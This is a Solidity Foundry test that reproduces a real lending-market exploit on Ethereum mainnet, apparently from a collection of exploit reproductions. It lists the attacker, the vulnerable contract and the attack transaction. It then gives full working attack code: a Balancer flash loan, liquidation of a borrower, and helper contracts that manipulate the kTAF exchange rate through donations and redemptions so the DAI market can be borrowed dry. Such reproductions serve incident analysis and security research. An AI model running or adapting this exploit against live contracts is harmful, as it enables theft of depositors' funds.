// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$8K
// Attacker : https://etherscan.io/address/0x9b99d7ce9e39c68ab93348fd31fd4c99f79e4b19
// Attack Contract : https://etherscan.io/address/0xa6d35c97bd00b99a962393408aaa9eb275a45c5e
// Vuln Contract : https://etherscan.io/address/0xf5140fc35c6f94d02d7466f793feb0216082d7e5
// Attack Tx : https://etherscan.io/tx/0x325999373f1aae98db2d89662ff1afbe0c842736f7564d16a7b52bf5c777d3a4

// @Analysis
// https://defimon.xyz/attack/mainnet/0x325999373f1aae98db2d89662ff1afbe0c842736f7564d16a7b52bf5c777d3a4

interface ICErc20Immutable {
    function borrow(uint256 borrowAmount) external returns (uint256);

    function borrowBalanceStored(address account) external view returns (uint256);

    function liquidateBorrow(
        address borrower,
        uint256 repayAmount,
        address cTokenCollateral
    ) external returns (uint256);
}

interface IComptroller {
    function liquidateCalculateSeizeTokens(
        address cTokenBorrowed,
        address cTokenCollateral,
        uint256 actualRepayAmount
    ) external view returns (uint256, uint256);

    function enterMarkets(address[] memory cTokens) external returns (uint256[] memory);
}

contract ContractTest is Test {
    IBalancerVault private constant Vault = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 private constant TAF = IERC20(0xf573E6740045b5387F6d36a26B102C2adF639af5);
    ICErc20Delegate private constant kTAF = ICErc20Delegate(payable(0xf5140fC35C6f94D02d7466f793fEB0216082d7E5));
    ICErc20Immutable private constant kDAI = ICErc20Immutable(0xE5C6c14F466A4F3A73eCEc7F3aAaA15c5EcBc769);
    IComptroller private constant Unitroller = IComptroller(0x959Fb43EF08F415da0AeA39BEEf92D96f41E41b3);
    address private constant borrower = 0x3cF7e9d9dCfeD77f295CF7A7F5539eC407D9a67d;

    function setUp() public {
        vm.createSelectFork("mainnet", 18_385_885);
        vm.label(address(Vault), "Vault");
        vm.label(address(DAI), "DAI");
        vm.label(address(kTAF), "kTAF");
        vm.label(address(kDAI), "kDAI");
        vm.label(address(Unitroller), "Unitroller");
        vm.label(borrower, "borrower");
    }

    function testExploit() public {
        emit log_named_decimal_uint("Attacker DAI balance before exploit", DAI.balanceOf(address(this)), DAI.decimals());

        emit log_named_decimal_uint("Attacker TAF balance before exploit", TAF.balanceOf(address(this)), TAF.decimals());

        address[] memory tokens = new address[](1);
        tokens[0] = address(DAI);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = 4000 * 1e18;
        Vault.flashLoan(address(this), tokens, amounts, bytes(""));

        emit log_named_decimal_uint("Attacker DAI balance after exploit", DAI.balanceOf(address(this)), DAI.decimals());

        emit log_named_decimal_uint("Attacker TAF balance after exploit", TAF.balanceOf(address(this)), TAF.decimals());
    }

    function receiveFlashLoan(
        address[] calldata tokens,
        uint256[] calldata amounts,
        uint256[] calldata feeAmounts,
        bytes calldata userData
    ) external {
        DAI.approve(address(kDAI), type(uint256).max);

        while (true) {
            uint256 repayAmount = kDAI.borrowBalanceStored(borrower) / 10;
            (, uint256 numCtokenCollateral) =
                Unitroller.liquidateCalculateSeizeTokens(address(kDAI), address(kTAF), repayAmount);

            if (numCtokenCollateral <= kTAF.balanceOf(borrower)) {
                kDAI.liquidateBorrow(borrower, repayAmount, address(kTAF));
            } else {
                repayAmount =
                    ((kDAI.borrowBalanceStored(borrower) / 10) * kTAF.balanceOf(borrower)) / numCtokenCollateral;
                kDAI.liquidateBorrow(borrower, repayAmount, address(kTAF));

                while (DAI.balanceOf(address(kDAI)) > 1) {
                    kTAF.redeem(kTAF.balanceOf(address(this)));
                    ExploitHelper helper = new ExploitHelper();
                    TAF.transfer(address(helper), TAF.balanceOf(address(this)));

                    helper.start();
                    kDAI.liquidateBorrow(address(helper), 1, address(kTAF));
                    kTAF.redeem(1);
                }
                DAI.transfer(address(Vault), amounts[0]);
                break;
            }
        }
    }
}

contract ExploitHelper {
    ICErc20Immutable private constant kDAI = ICErc20Immutable(0xE5C6c14F466A4F3A73eCEc7F3aAaA15c5EcBc769);
    ICErc20Delegate private constant kTAF = ICErc20Delegate(payable(0xf5140fC35C6f94D02d7466f793fEB0216082d7E5));
    IERC20 private constant DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IERC20 private constant TAF = IERC20(0xf573E6740045b5387F6d36a26B102C2adF639af5);
    IComptroller private constant Unitroller = IComptroller(0x959Fb43EF08F415da0AeA39BEEf92D96f41E41b3);

    function start() external {
        address[] memory cTokens = new address[](1);
        cTokens[0] = address(kTAF);
        Unitroller.enterMarkets(cTokens);

        TAF.transfer(address(kTAF), 1);
        TAF.approve(address(kTAF), type(uint256).max);
        uint256 amountTAF = TAF.balanceOf(address(this));
        kTAF.mint(TAF.balanceOf(address(this)));
        kTAF.redeem(kTAF.balanceOf(address(this)) - 2);
        TAF.transfer(address(kTAF), TAF.balanceOf(address(this)));

        uint256 amountDAI = DAI.balanceOf(address(kDAI));
        if (amountDAI > 1320 * 1e18) {
            amountDAI = 1320 * 1e18;
        }
        kDAI.borrow(amountDAI);

        kTAF.redeemUnderlying(amountTAF);

        DAI.transfer(msg.sender, amountDAI);
        TAF.transfer(msg.sender, amountTAF);
    }
}
